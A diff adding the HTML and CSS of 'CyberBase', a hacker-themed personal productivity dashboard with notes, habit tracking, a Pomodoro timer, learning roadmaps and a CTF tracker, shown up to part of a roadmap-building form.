@@ -1,0 +1,1935 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberBase — Your Hacker Productivity OS</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10;
+    --surface: #0f1319;
+    --surface2: #161b24;
+    --border: #1e2a3a;
+    --accent: #00ff88;
+    --accent2: #00c4ff;
+    --accent3: #ff4d6d;
+    --accent4: #ffd700;
+    --text: #c8d8e8;
+    --text2: #6a8aa8;
+    --glow: 0 0 20px rgba(0,255,136,0.3);
+    --glow2: 0 0 20px rgba(0,196,255,0.3);
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  /* Scanline overlay */
+  body::before {
+    content:'';
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.01) 2px, rgba(0,255,136,0.01) 4px);
+    pointer-events:none;
+    z-index:9999;
+  }
+
+  /* HEADER */
+  .header {
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:14px 28px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(10,12,16,0.95);
+    position:sticky;
+    top:0;
+    z-index:100;
+  }
+  .logo {
+    font-family:'Orbitron',monospace;
+    font-weight:900;
+    font-size:20px;
+    color: var(--accent);
+    text-shadow: var(--glow);
+    letter-spacing:2px;
+  }
+  .logo span { color: var(--accent2); }
+  .nav {
+    display:flex;
+    gap:4px;
+  }
+  .nav-btn {
+    background:none;
+    border: 1px solid transparent;
+    color: var(--text2);
+    font-family:'Rajdhani',sans-serif;
+    font-size:13px;
+    font-weight:600;
+    padding:7px 16px;
+    cursor:pointer;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    border-radius:4px;
+    transition:all 0.2s;
+  }
+  .nav-btn:hover { color:var(--accent); border-color:var(--border); }
+  .nav-btn.active {
+    color:var(--accent);
+    border-color:var(--accent);
+    background:rgba(0,255,136,0.07);
+    box-shadow: var(--glow);
+  }
+  .status-bar {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color:var(--text2);
+  }
+  .status-bar span { color:var(--accent); }
+
+  /* MAIN */
+  .main { padding:24px 28px; max-width:1400px; margin:0 auto; }
+  .page { display:none; }
+  .page.active { display:block; }
+
+  /* SECTION TITLE */
+  .section-title {
+    font-family:'Orbitron',monospace;
+    font-size:13px;
+    letter-spacing:3px;
+    color:var(--text2);
+    text-transform:uppercase;
+    margin-bottom:16px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .section-title::after {
+    content:'';
+    flex:1;
+    height:1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  /* GRID LAYOUTS */
+  .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+  .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:20px; }
+  .grid-auto { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:16px; }
+
+  /* CARDS */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius:8px;
+    padding:20px;
+    position:relative;
+    overflow:hidden;
+  }
+  .card::before {
+    content:'';
+    position:absolute;
+    top:0;left:0;right:0;
+    height:2px;
+    background: linear-gradient(90deg, var(--accent), transparent);
+  }
+  .card-blue::before { background: linear-gradient(90deg, var(--accent2), transparent); }
+  .card-red::before { background: linear-gradient(90deg, var(--accent3), transparent); }
+  .card-gold::before { background: linear-gradient(90deg, var(--accent4), transparent); }
+
+  /* INPUTS */
+  input, textarea, select {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family:'Rajdhani',sans-serif;
+    font-size:14px;
+    padding:9px 12px;
+    border-radius:4px;
+    outline:none;
+    width:100%;
+    transition:border-color 0.2s;
+  }
+  input:focus, textarea:focus, select:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(0,255,136,0.1);
+  }
+  input::placeholder, textarea::placeholder { color:var(--text2); }
+  textarea { resize:vertical; min-height:80px; }
+
+  /* BUTTONS */
+  .btn {
+    background: rgba(0,255,136,0.1);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-family:'Rajdhani',sans-serif;
+    font-weight:700;
+    font-size:13px;
+    padding:9px 18px;
+    border-radius:4px;
+    cursor:pointer;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    transition:all 0.2s;
+  }
+  .btn:hover { background:rgba(0,255,136,0.2); box-shadow:var(--glow); }
+  .btn-blue { background:rgba(0,196,255,0.1); border-color:var(--accent2); color:var(--accent2); }
+  .btn-blue:hover { background:rgba(0,196,255,0.2); box-shadow:var(--glow2); }
+  .btn-red { background:rgba(255,77,109,0.1); border-color:var(--accent3); color:var(--accent3); }
+  .btn-red:hover { background:rgba(255,77,109,0.2); }
+  .btn-sm { padding:5px 12px; font-size:11px; }
+  .btn-ghost { background:none; border-color:var(--border); color:var(--text2); }
+  .btn-ghost:hover { border-color:var(--text2); color:var(--text); box-shadow:none; }
+
+  /* TAG */
+  .tag {
+    display:inline-block;
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    padding:2px 8px;
+    border-radius:2px;
+    letter-spacing:1px;
+  }
+  .tag-green { background:rgba(0,255,136,0.1); color:var(--accent); border:1px solid rgba(0,255,136,0.3); }
+  .tag-blue { background:rgba(0,196,255,0.1); color:var(--accent2); border:1px solid rgba(0,196,255,0.3); }
+  .tag-red { background:rgba(255,77,109,0.1); color:var(--accent3); border:1px solid rgba(255,77,109,0.3); }
+  .tag-gold { background:rgba(255,215,0,0.1); color:var(--accent4); border:1px solid rgba(255,215,0,0.3); }
+
+  /* ===================== NOTES PAGE ===================== */
+  .notes-toolbar {
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+    align-items:center;
+    flex-wrap:wrap;
+  }
+  .notes-toolbar input { max-width:260px; }
+  .note-type-tabs { display:flex; gap:4px; }
+  .note-type-tab {
+    padding:6px 14px;
+    font-size:12px;
+    font-family:'Share Tech Mono',monospace;
+    border:1px solid var(--border);
+    border-radius:4px;
+    color:var(--text2);
+    cursor:pointer;
+    background:none;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .note-type-tab.active { color:var(--accent); border-color:var(--accent); background:rgba(0,255,136,0.07); }
+
+  .notes-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:14px; }
+  .note-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:16px;
+    cursor:pointer;
+    transition:all 0.2s;
+    position:relative;
+  }
+  .note-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
+  .note-card-title {
+    font-family:'Orbitron',monospace;
+    font-size:13px;
+    color:var(--accent2);
+    margin-bottom:8px;
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    gap:8px;
+  }
+  .note-card-body { font-size:13px; color:var(--text2); line-height:1.5; }
+  .note-card-footer { margin-top:10px; display:flex; justify-content:space-between; align-items:center; }
+  .note-date { font-family:'Share Tech Mono',monospace; font-size:10px; color:#3d5a6a; }
+  .note-actions { display:flex; gap:6px; }
+  .icon-btn {
+    background:none;
+    border:none;
+    cursor:pointer;
+    font-size:14px;
+    padding:2px 5px;
+    border-radius:3px;
+    transition:all 0.2s;
+    color:var(--text2);
+  }
+  .icon-btn:hover { background:rgba(255,255,255,0.05); color:var(--text); }
+
+  /* Note modal */
+  .modal-overlay {
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background:rgba(0,0,0,0.8);
+    z-index:1000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    backdrop-filter:blur(4px);
+  }
+  .modal {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:28px;
+    width:600px;
+    max-width:95vw;
+    max-height:85vh;
+    overflow-y:auto;
+    position:relative;
+  }
+  .modal-title {
+    font-family:'Orbitron',monospace;
+    font-size:14px;
+    color:var(--accent);
+    margin-bottom:20px;
+    letter-spacing:2px;
+  }
+  .modal-close {
+    position:absolute;
+    top:16px;right:16px;
+    background:none;border:none;
+    color:var(--text2);font-size:20px;
+    cursor:pointer;
+  }
+  .modal-close:hover { color:var(--accent3); }
+  .form-row { margin-bottom:14px; }
+  .form-label {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color:var(--text2);
+    letter-spacing:1px;
+    margin-bottom:6px;
+    display:block;
+  }
+  .form-row-inline { display:flex; gap:10px; }
+
+  /* Checklist */
+  .checklist-items { list-style:none; margin:10px 0; }
+  .checklist-item {
+    display:flex;
+    align-items:center;
+    gap:10px;
+    padding:7px 0;
+    border-bottom:1px solid var(--border);
+  }
+  .checklist-item:last-child { border-bottom:none; }
+  .check-box {
+    width:16px;height:16px;
+    border:1px solid var(--accent);
+    border-radius:2px;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+    font-size:10px;
+    color:var(--accent);
+    transition:all 0.2s;
+  }
+  .check-box.checked { background:rgba(0,255,136,0.2); }
+  .check-label { flex:1; font-size:13px; }
+  .check-label.done { text-decoration:line-through; color:var(--text2); }
+  .add-check-row { display:flex; gap:8px; margin-top:8px; }
+
+  /* ===================== HABITS PAGE ===================== */
+  .habits-top { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:20px; gap:20px; flex-wrap:wrap; }
+  .streak-summary {
+    display:flex;
+    gap:16px;
+    flex-wrap:wrap;
+  }
+  .streak-stat {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px 20px;
+    text-align:center;
+    min-width:100px;
+  }
+  .streak-num {
+    font-family:'Orbitron',monospace;
+    font-size:28px;
+    font-weight:900;
+    color:var(--accent);
+    line-height:1;
+  }
+  .streak-label { font-size:11px; color:var(--text2); margin-top:4px; letter-spacing:1px; text-transform:uppercase; font-family:'Share Tech Mono',monospace; }
+
+  .habit-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:18px;
+    margin-bottom:12px;
+  }
+  .habit-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
+  .habit-name { font-size:16px; font-weight:700; color:var(--text); }
+  .habit-meta { display:flex; gap:8px; align-items:center; }
+  .habit-streak { font-family:'Orbitron',monospace; font-size:18px; color:var(--accent4); font-weight:700; }
+  .habit-grid { display:flex; gap:3px; flex-wrap:wrap; }
+  .habit-day {
+    width:14px;height:14px;
+    border-radius:2px;
+    background:var(--surface2);
+    border:1px solid var(--border);
+    cursor:pointer;
+    transition:all 0.2s;
+    position:relative;
+  }
+  .habit-day.done { background:var(--accent); border-color:var(--accent); box-shadow:0 0 6px rgba(0,255,136,0.5); }
+  .habit-day.today { border-color:var(--accent2); box-shadow:0 0 4px rgba(0,196,255,0.5); }
+  .habit-today-btn {
+    background:rgba(0,255,136,0.1);
+    border:1px solid var(--accent);
+    color:var(--accent);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    padding:5px 12px;
+    border-radius:3px;
+    cursor:pointer;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .habit-today-btn.checked { background:rgba(0,255,136,0.25); }
+  .habit-today-btn:hover { background:rgba(0,255,136,0.2); }
+  .habit-progress-bar {
+    height:4px;
+    background:var(--surface2);
+    border-radius:2px;
+    margin-top:10px;
+    overflow:hidden;
+  }
+  .habit-progress-fill {
+    height:100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    border-radius:2px;
+    transition:width 0.5s ease;
+  }
+
+  /* Chart area */
+  .chart-container { height:120px; position:relative; margin-top:8px; }
+  .chart-bars { display:flex; align-items:flex-end; height:100px; gap:3px; }
+  .chart-bar {
+    flex:1;
+    border-radius:3px 3px 0 0;
+    min-width:8px;
+    transition:height 0.4s ease;
+    position:relative;
+    cursor:default;
+  }
+  .chart-labels { display:flex; gap:3px; margin-top:4px; }
+  .chart-label { flex:1; text-align:center; font-family:'Share Tech Mono',monospace; font-size:9px; color:var(--text2); }
+
+  /* ===================== POMODORO PAGE ===================== */
+  .pomo-center { display:flex; flex-direction:column; align-items:center; padding:20px 0; }
+  .pomo-ring-wrap {
+    position:relative;
+    width:280px;height:280px;
+    margin:20px 0;
+  }
+  .pomo-ring {
+    transform:rotate(-90deg);
+  }
+  .pomo-ring-bg { fill:none; stroke:var(--surface2); stroke-width:12; }
+  .pomo-ring-fill { fill:none; stroke-width:12; stroke-linecap:round; transition:stroke-dashoffset 0.5s linear, stroke 0.5s; }
+  .pomo-time {
+    position:absolute;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    text-align:center;
+  }
+  .pomo-digits {
+    font-family:'Orbitron',monospace;
+    font-size:54px;
+    font-weight:900;
+    color:var(--text);
+    line-height:1;
+    text-shadow: 0 0 30px rgba(0,255,136,0.3);
+  }
+  .pomo-mode-label {
+    font-family:'Share Tech Mono',monospace;
+    font-size:12px;
+    color:var(--text2);
+    letter-spacing:2px;
+    margin-top:4px;
+  }
+  .pomo-session { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent4); letter-spacing:1px; margin-top:4px; }
+  .pomo-controls { display:flex; gap:12px; margin-top:10px; }
+  .pomo-btn-big {
+    width:64px;height:64px;
+    border-radius:50%;
+    border:2px solid var(--accent);
+    background:rgba(0,255,136,0.08);
+    color:var(--accent);
+    font-size:24px;
+    cursor:pointer;
+    transition:all 0.2s;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .pomo-btn-big:hover { background:rgba(0,255,136,0.2); box-shadow:var(--glow); }
+  .pomo-btn-big.pause { border-color:var(--accent4); color:var(--accent4); background:rgba(255,215,0,0.08); }
+  .pomo-btn-big.stop { border-color:var(--accent3); color:var(--accent3); background:rgba(255,77,109,0.08); }
+  .pomo-modes { display:flex; gap:8px; margin-bottom:10px; }
+  .pomo-mode-btn {
+    background:none;
+    border:1px solid var(--border);
+    color:var(--text2);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    padding:6px 16px;
+    border-radius:20px;
+    cursor:pointer;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .pomo-mode-btn.active { border-color:var(--accent); color:var(--accent); background:rgba(0,255,136,0.07); }
+  .pomo-settings { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; width:100%; max-width:400px; margin:16px 0; }
+  .pomo-set-box { text-align:center; }
+  .pomo-set-label { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text2); letter-spacing:1px; margin-bottom:4px; }
+  .pomo-set-input {
+    width:70px;
+    text-align:center;
+    font-family:'Orbitron',monospace;
+    font-size:18px;
+    color:var(--accent2);
+    background:var(--surface2);
+    border:1px solid var(--border);
+    border-radius:4px;
+    padding:6px;
+  }
+  .pomo-log { width:100%; max-width:500px; margin-top:20px; }
+  .pomo-log-item {
+    display:flex;
+    justify-content:space-between;
+    padding:8px 12px;
+    border-bottom:1px solid var(--border);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+  }
+  .pomo-log-item:last-child { border-bottom:none; }
+
+  /* ===================== ROADMAP PAGE ===================== */
+  .roadmap-selector { display:flex; gap:10px; margin-bottom:20px; flex-wrap:wrap; }
+  .roadmap-tab {
+    padding:8px 18px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    color:var(--text2);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    cursor:pointer;
+    background:none;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .roadmap-tab.active { border-color:var(--accent); color:var(--accent); background:rgba(0,255,136,0.07); }
+
+  .roadmap-timeline { position:relative; padding-left:30px; }
+  .roadmap-timeline::before {
+    content:'';
+    position:absolute;
+    left:10px;top:0;bottom:0;
+    width:2px;
+    background: linear-gradient(180deg, var(--accent), var(--accent2), var(--accent3));
+  }
+  .roadmap-phase {
+    position:relative;
+    margin-bottom:24px;
+  }
+  .roadmap-phase::before {
+    content:'';
+    position:absolute;
+    left:-24px;top:8px;
+    width:10px;height:10px;
+    border-radius:50%;
+    background:var(--accent);
+    border:2px solid var(--bg);
+    box-shadow:0 0 8px var(--accent);
+  }
+  .roadmap-phase.phase-2::before { background:var(--accent2); box-shadow:0 0 8px var(--accent2); }
+  .roadmap-phase.phase-3::before { background:var(--accent4); box-shadow:0 0 8px var(--accent4); }
+  .roadmap-phase.phase-4::before { background:#a855f7; box-shadow:0 0 8px #a855f7; }
+  .roadmap-phase.phase-5::before { background:var(--accent3); box-shadow:0 0 8px var(--accent3); }
+
+  .phase-header {
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:10px;
+  }
+  .phase-time {
+    font-family:'Orbitron',monospace;
+    font-size:11px;
+    color:var(--accent4);
+    background:rgba(255,215,0,0.1);
+    border:1px solid rgba(255,215,0,0.3);
+    padding:3px 10px;
+    border-radius:3px;
+    letter-spacing:1px;
+    white-space:nowrap;
+  }
+  .phase-title { font-size:17px; font-weight:700; color:var(--text); }
+  .phase-tasks { list-style:none; }
+  .phase-task {
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    padding:7px 10px;
+    border-radius:4px;
+    margin-bottom:4px;
+    font-size:13px;
+    color:var(--text2);
+    cursor:pointer;
+    transition:all 0.2s;
+  }
+  .phase-task:hover { background:rgba(255,255,255,0.03); }
+  .phase-task.done { color:rgba(100,140,120,0.7); }
+  .phase-task.done .task-check { background:rgba(0,255,136,0.2); border-color:var(--accent); color:var(--accent); }
+  .task-check {
+    width:16px;height:16px;
+    border:1px solid var(--border);
+    border-radius:2px;
+    flex-shrink:0;
+    margin-top:1px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:9px;
+  }
+  .phase-resources { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; padding-left:2px; }
+  .resource-chip {
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    padding:3px 9px;
+    border-radius:3px;
+    background:rgba(0,196,255,0.07);
+    border:1px solid rgba(0,196,255,0.2);
+    color:var(--accent2);
+    letter-spacing:0.5px;
+  }
+
+  /* ===================== CTF TRACKER ===================== */
+  .ctf-stats { display:grid; grid-template-columns:repeat(4,1fr); gap:12px; margin-bottom:20px; }
+  .ctf-stat {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px;
+    text-align:center;
+  }
+  .ctf-stat-num { font-family:'Orbitron',monospace; font-size:24px; font-weight:900; line-height:1; }
+  .ctf-stat-label { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text2); margin-top:4px; letter-spacing:1px; }
+  .ctf-list { }
+  .ctf-item {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px 18px;
+    margin-bottom:10px;
+    display:flex;
+    align-items:center;
+    gap:16px;
+  }
+  .ctf-item-name { font-size:15px; font-weight:700; flex:1; }
+  .ctf-item-meta { display:flex; gap:8px; align-items:center; }
+  .ctf-difficulty {
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    padding:2px 8px;
+    border-radius:2px;
+  }
+  .diff-easy { background:rgba(0,255,136,0.1); color:var(--accent); border:1px solid rgba(0,255,136,0.3); }
+  .diff-med { background:rgba(255,215,0,0.1); color:var(--accent4); border:1px solid rgba(255,215,0,0.3); }
+  .diff-hard { background:rgba(255,77,109,0.1); color:var(--accent3); border:1px solid rgba(255,77,109,0.3); }
+  .ctf-points { font-family:'Orbitron',monospace; font-size:16px; color:var(--accent4); font-weight:700; }
+  .add-ctf-form { background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:20px; margin-bottom:20px; }
+  .form-inline { display:flex; gap:10px; flex-wrap:wrap; align-items:flex-end; }
+  .form-inline .form-row { margin-bottom:0; flex:1; min-width:120px; }
+
+  /* ===================== VOCAB / TOOL REFERENCE ===================== */
+  .vocab-search { display:flex; gap:10px; margin-bottom:16px; }
+  .vocab-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:12px; }
+  .vocab-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px;
+  }
+  .vocab-term {
+    font-family:'Orbitron',monospace;
+    font-size:13px;
+    color:var(--accent2);
+    margin-bottom:6px;
+  }
+  .vocab-def { font-size:13px; color:var(--text2); line-height:1.5; }
+  .vocab-cat { margin-top:8px; }
+
+  /* ===================== UTILITY ===================== */
+  .flex { display:flex; }
+  .flex-center { display:flex; align-items:center; justify-content:center; }
+  .gap-8 { gap:8px; }
+  .gap-12 { gap:12px; }
+  .mt-8 { margin-top:8px; }
+  .mt-12 { margin-top:12px; }
+  .mt-16 { margin-top:16px; }
+  .mb-8 { margin-bottom:8px; }
+  .mb-12 { margin-bottom:12px; }
+  .w100 { width:100%; }
+  .text-accent { color:var(--accent); }
+  .text-accent2 { color:var(--accent2); }
+  .text-muted { color:var(--text2); }
+  .font-mono { font-family:'Share Tech Mono',monospace; }
+  .font-orb { font-family:'Orbitron',monospace; }
+  .hidden { display:none !important; }
+
+  /* Empty state */
+  .empty-state {
+    text-align:center;
+    padding:60px 20px;
+    color:var(--text2);
+    font-family:'Share Tech Mono',monospace;
+    font-size:13px;
+    letter-spacing:1px;
+  }
+  .empty-icon { font-size:40px; margin-bottom:12px; opacity:0.5; }
+
+  /* Notification toast */
+  .toast {
+    position:fixed;
+    bottom:24px;right:24px;
+    background:var(--surface);
+    border:1px solid var(--accent);
+    color:var(--accent);
+    font-family:'Share Tech Mono',monospace;
+    font-size:12px;
+    padding:10px 20px;
+    border-radius:6px;
+    z-index:9000;
+    box-shadow:var(--glow);
+    animation:slideIn 0.3s ease;
+    letter-spacing:1px;
+  }
+  @keyframes slideIn { from{transform:translateX(100%);opacity:0} to{transform:translateX(0);opacity:1} }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background:var(--bg); }
+  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+  ::-webkit-scrollbar-thumb:hover { background:var(--text2); }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">CYBER<span>BASE</span></div>
+  <nav class="nav">
+    <button class="nav-btn active" onclick="showPage('notes')">📝 Notes</button>
+    <button class="nav-btn" onclick="showPage('habits')">🔥 Habits</button>
+    <button class="nav-btn" onclick="showPage('pomodoro')">⏱ Pomodoro</button>
+    <button class="nav-btn" onclick="showPage('roadmap')">🗺 Roadmap</button>
+    <button class="nav-btn" onclick="showPage('ctf')">🏴 CTF</button>
+    <button class="nav-btn" onclick="showPage('vocab')">📖 Vocab</button>
+  </nav>
+  <div class="status-bar" id="statusBar">SYS: <span>ONLINE</span> | <span id="clockDisplay"></span></div>
+</div>
+
+<div class="main">
+
+<!-- =================== NOTES PAGE =================== -->
+<div class="page active" id="page-notes">
+  <div class="notes-toolbar">
+    <input type="text" id="noteSearch" placeholder="search notes..." oninput="renderNotes()">
+    <div class="note-type-tabs">
+      <button class="note-type-tab active" onclick="filterNotes('all',this)">ALL</button>
+      <button class="note-type-tab" onclick="filterNotes('note',this)">NOTES</button>
+      <button class="note-type-tab" onclick="filterNotes('checklist',this)">CHECKLISTS</button>
+    </div>
+    <button class="btn btn-sm" onclick="openNoteModal()">+ NEW NOTE</button>
+    <button class="btn btn-sm btn-blue" onclick="openChecklistModal()">+ CHECKLIST</button>
+  </div>
+  <div class="notes-grid" id="notesGrid"></div>
+</div>
+
+<!-- =================== HABITS PAGE =================== -->
+<div class="page" id="page-habits">
+  <div class="habits-top">
+    <div>
+      <div class="section-title">HABIT TRACKER</div>
+      <div class="streak-summary" id="streakSummary"></div>
+    </div>
+    <button class="btn" onclick="openHabitModal()">+ ADD HABIT</button>
+  </div>
+  <div id="habitsList"></div>
+</div>
+
+<!-- =================== POMODORO PAGE =================== -->
+<div class="page" id="page-pomodoro">
+  <div class="grid-2" style="align-items:start; gap:32px;">
+    <div class="pomo-center">
+      <div class="section-title" style="width:100%">POMODORO TIMER</div>
+      <div class="pomo-modes">
+        <button class="pomo-mode-btn active" id="modeWork" onclick="setPomoMode('work')">FOCUS</button>
+        <button class="pomo-mode-btn" id="modeShort" onclick="setPomoMode('short')">SHORT BREAK</button>
+        <button class="pomo-mode-btn" id="modeLong" onclick="setPomoMode('long')">LONG BREAK</button>
+      </div>
+      <div class="pomo-ring-wrap">
+        <svg class="pomo-ring" width="280" height="280" viewBox="0 0 280 280">
+          <circle class="pomo-ring-bg" cx="140" cy="140" r="124"/>
+          <circle class="pomo-ring-fill" id="pomoRingFill" cx="140" cy="140" r="124"
+            stroke="#00ff88"
+            stroke-dasharray="779"
+            stroke-dashoffset="0"/>
+        </svg>
+        <div class="pomo-time">
+          <div class="pomo-digits" id="pomoDigits">25:00</div>
+          <div class="pomo-mode-label" id="pomoModeLabel">FOCUS SESSION</div>
+          <div class="pomo-session" id="pomoSession">SESSION #1</div>
+        </div>
+      </div>
+      <div class="pomo-controls">
+        <button class="pomo-btn-big" id="pomoPlayBtn" onclick="togglePomo()">▶</button>
+        <button class="pomo-btn-big stop" onclick="resetPomo()">■</button>
+        <button class="pomo-btn-big" style="border-color:var(--accent2);color:var(--accent2);background:rgba(0,196,255,0.08)" onclick="skipPomo()">⏭</button>
+      </div>
+      <div class="pomo-settings">
+        <div class="pomo-set-box">
+          <div class="pomo-set-label">FOCUS</div>
+          <input class="pomo-set-input" type="number" id="setWork" value="25" min="1" max="90" onchange="updatePomoSettings()">
+        </div>
+        <div class="pomo-set-box">
+          <div class="pomo-set-label">SHORT BRK</div>
+          <input class="pomo-set-input" type="number" id="setShort" value="5" min="1" max="30" onchange="updatePomoSettings()">
+        </div>
+        <div class="pomo-set-box">
+          <div class="pomo-set-label">LONG BRK</div>
+          <input class="pomo-set-input" type="number" id="setLong" value="15" min="1" max="60" onchange="updatePomoSettings()">
+        </div>
+      </div>
+    </div>
+    <div>
+      <div class="section-title">TODAY'S LOG</div>
+      <div class="card" style="padding:0;overflow:hidden;">
+        <div class="pomo-log" id="pomoLog" style="max-width:100%; margin:0; max-height:400px; overflow-y:auto;">
+          <div class="pomo-log-item" style="justify-content:center; color:var(--text2); padding:24px;">NO SESSIONS YET — START FOCUSING</div>
+        </div>
+      </div>
+      <div class="card mt-16" style="text-align:center;">
+        <div class="section-title">TOTAL FOCUS TIME</div>
+        <div class="font-orb" style="font-size:36px; color:var(--accent4);" id="totalFocusTime">0 min</div>
+        <div class="text-muted font-mono mt-8" style="font-size:11px;">TODAY</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- =================== ROADMAP PAGE =================== -->
+<div class="page" id="page-roadmap">
+  <div id="rmListView">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:12px;">
+      <div class="section-title" style="margin:0;flex:1">MY ROADMAPS</div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap;">
+        <button class="btn btn-blue btn-sm" onclick="openAIRoadmapModal()">🤖 GENERATE WITH AI</button>
+        <button class="btn btn-sm" onclick="openManualRoadmapModal()">✏ BUILD MANUALLY</button>
+        <button class="btn btn-sm" style="background:rgba(255,215,0,0.08);border-color:var(--accent4);color:var(--accent4);" onclick="openPasteRoadmapModal()">📋 PASTE & PARSE</button>
+      </div>
+    </div>
+    <div id="rmGrid"></div>
+  </div>
+  <div id="rmDetailView" style="display:none;">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
+      <button class="btn btn-ghost btn-sm" onclick="backToRoadmapList()">← BACK</button>
+      <div class="section-title" style="margin:0;flex:1" id="rmDetailTitle"></div>
+      <button class="btn btn-red btn-sm" id="rmDeleteBtn">🗑 DELETE</button>
+    </div>
+    <div id="rmDetailProgress" style="margin-bottom:16px;"></div>
+    <div class="roadmap-timeline" id="rmDetailContent"></div>
+  </div>
+</div>
+
+<!-- AI GENERATE MODAL -->
+<div class="modal-overlay hidden" id="aiRoadmapModal">
+  <div class="modal" style="width:700px;">
+    <div class="modal-title">🤖 GENERATE ROADMAP WITH AI</div>
+    <button class="modal-close" onclick="closeModal('aiRoadmapModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">WHAT DO YOU WANT TO LEARN / ACHIEVE?</label>
+      <textarea id="aiRmGoal" rows="3" placeholder="e.g. I want to learn web application hacking from scratch in 3 months&#10;e.g. I want to get OSCP certification in 6 months&#10;e.g. I want to become a network security engineer&#10;e.g. I am a beginner who wants to learn Python for automation"></textarea>
+    </div>
+    <button class="btn btn-blue w100" id="aiRmGenBtn" onclick="generateAIRoadmap()" style="margin-bottom:12px;">GENERATE ROADMAP</button>
+    <div id="aiRmStatus" style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent2);min-height:16px;letter-spacing:1px;"></div>
+  </div>
+</div>
+
+<!-- MANUAL BUILD MODAL -->
+<div class="modal-overlay hidden" id="manualRoadmapModal">
+  <div class="modal" style="width:700px;max-height:90vh;">
+    <div class="modal-title">✏ BUILD YOUR ROADMAP</div>
+    <button class="modal-close" onclick="closeModal('manualRoadmapModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">ROADMAP TITLE</label>
+      <input type="text" id="manualRmTitle" placeholder="e.g. My Python Journey, OSCP Prep, Web Dev Path...">
+    </div>
+    <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+      <label class="form-label" style="margin:0">PHASES / MILESTONES</label>
